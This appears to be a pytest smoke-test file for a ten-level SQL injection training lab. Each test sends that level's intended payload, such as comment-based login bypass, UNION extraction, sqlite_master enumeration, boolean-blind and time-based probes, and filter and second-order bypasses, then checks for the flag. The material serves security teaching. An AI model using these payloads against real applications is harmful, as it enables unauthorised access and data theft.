"""
Smoke tests for the SQL Injection CTF Lab.

Runs the Flask app in-process (test client, no network needed) and
exercises the *intended* exploit path for every level, plus reset and
progress tracking. This is meant to verify the lab itself works, not to
teach exploitation technique -- see SOLUTIONS.md for explanations.

Run with:
    pip install -r requirements.txt pytest
    pytest tests/ -v
"""

import os
import sys

import pytest

APP_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "app")
sys.path.insert(0, APP_DIR)

import app as flask_app_module  # noqa: E402
from database import FLAGS  # noqa: E402


@pytest.fixture()
def client():
    flask_app_module.app.config["TESTING"] = True
    flask_app_module.init_db(reset=True)
    with flask_app_module.app.test_client() as c:
        yield c
    flask_app_module.init_db(reset=True)


def test_index_and_static(client):
    assert client.get("/").status_code == 200
    assert client.get("/progress").status_code == 200
    assert client.get("/logs").status_code == 200


def test_level1_auth_bypass(client):
    resp = client.post("/level1", data={"username": "admin'--", "password": "x"})
    assert FLAGS[1] in resp.get_data(as_text=True)


def test_level2_union(client):
    q = "zzzzz' UNION SELECT flag_value, flag_value, 1 FROM level2_secret_flags--"
    resp = client.get("/level2", query_string={"q": q})
    assert FLAGS[2] in resp.get_data(as_text=True)


def test_level3_enumeration(client):
    enum_q = "zzzz' UNION SELECT name, sql FROM sqlite_master--"
    resp = client.get("/level3", query_string={"q": enum_q})
    assert "level3_secret_vault" in resp.get_data(as_text=True)

    extract_q = "zzzz' UNION SELECT secret_name, secret_value FROM level3_secret_vault--"
    resp = client.get("/level3", query_string={"q": extract_q})
    assert FLAGS[3] in resp.get_data(as_text=True)


def test_level4_hidden_output(client):
    resp = client.get("/level4", query_string={"id": "0 OR 1=1--"})
    assert FLAGS[4] in resp.get_data(as_text=True)


def test_level5_boolean_blind(client):
    # The level's intro text always mentions the phrase "User not found" as
    # part of its instructions, so we match the specific result <div> (by
    # its CSS class) rather than doing a raw substring search on the page.
    def result_is_found(resp):
        html = resp.get_data(as_text=True)
        assert ('message success">User found.' in html) != (
            'message error">User not found.' in html
        )
        return 'message success">User found.' in html

    true_resp = client.get("/level5", query_string={"username": "targetuser' AND '1'='1"})
    false_resp = client.get("/level5", query_string={"username": "targetuser' AND '1'='2"})
    assert result_is_found(true_resp) is True
    assert result_is_found(false_resp) is False

    correct_char = "x' OR (SELECT substr(secret_flag,1,1) FROM level5_users)='F'--"
    wrong_char = "x' OR (SELECT substr(secret_flag,1,1) FROM level5_users)='Z'--"
    correct_resp = client.get("/level5", query_string={"username": correct_char})
    wrong_resp = client.get("/level5", query_string={"username": wrong_char})
    assert result_is_found(correct_resp) is True
    assert result_is_found(wrong_resp) is False


def test_level6_time_based(client):
    baseline = client.get("/level6", query_string={"username": "targetuser"})
    assert baseline.status_code == 200

    delay_payload = (
        "x' OR (WITH RECURSIVE r(x) AS (VALUES(1) UNION ALL "
        "SELECT x+1 FROM r WHERE x<3000000) SELECT count(*) FROM r)>0--"
    )
    import time

    start = time.time()
    resp = client.get("/level6", query_string={"username": delay_payload})
    elapsed = time.time() - start
    assert resp.status_code == 200
    assert elapsed > 0.2  # measurably slower than an instant query


def test_level7_filter_and_bypass(client):
    blocked = client.post(
        "/level7", data={"username": "x' union select 1,2,3,4--", "password": "x"}
    )
    assert "Blocked" in blocked.get_data(as_text=True)

    bypass = client.post("/level7", data={"username": "x", "password": "x' OR '1'='1"})
    assert FLAGS[7] in bypass.get_data(as_text=True)


def test_level8_waf_bypass(client):
    resp = client.post("/level8", data={"username": "x", "password": "x' OR '1'='1"})
    assert FLAGS[8] in resp.get_data(as_text=True)


def test_level9_second_order(client):
    payload_username = (
        "nonexistent' UNION SELECT username, bio FROM level9_profiles "
        "WHERE username='system"
    )
    reg = client.post("/level9", data={"action": "register", "username": payload_username})
    assert reg.status_code == 200

    process = client.post("/level9/process")
    assert FLAGS[9] in process.get_data(as_text=True)


def test_level10_combined_chain(client):
    login = client.post("/level10", data={"action": "login", "username": "boss'--", "password": "x"})
    assert "Logged in" in login.get_data(as_text=True)

    enum = client.get(
        "/level10/search",
        query_string={"code": "zzz' UNION SELECT name, sql FROM sqlite_master WHERE type='table"},
    )
    assert "level10_vault" in enum.get_data(as_text=True)

    extract = client.get(
        "/level10/search",
        query_string={"code": "zzz' UNION SELECT label, value FROM level10_vault--"},
    )
    assert FLAGS[10] in extract.get_data(as_text=True)


def test_submit_flag_and_progress(client):
    client.post("/level1", data={"username": "admin'--", "password": "x"})
    resp = client.post("/submit-flag/1", data={"flag": FLAGS[1]}, follow_redirects=True)
    assert resp.status_code == 200

    progress = client.get("/progress").get_data(as_text=True)
    assert "Completed" in progress

    wrong = client.post("/submit-flag/2", data={"flag": "FLAG{not_the_right_one}"})
    assert wrong.status_code in (302, 200)


def test_reset_lab(client):
    client.post("/submit-flag/1", data={"flag": FLAGS[1]})
    resp = client.post("/reset")
    assert resp.status_code in (302, 200)

    # Level 1 must still be exploitable after a reset.
    login = client.post("/level1", data={"username": "admin'--", "password": "x"})
    assert FLAGS[1] in login.get_data(as_text=True)
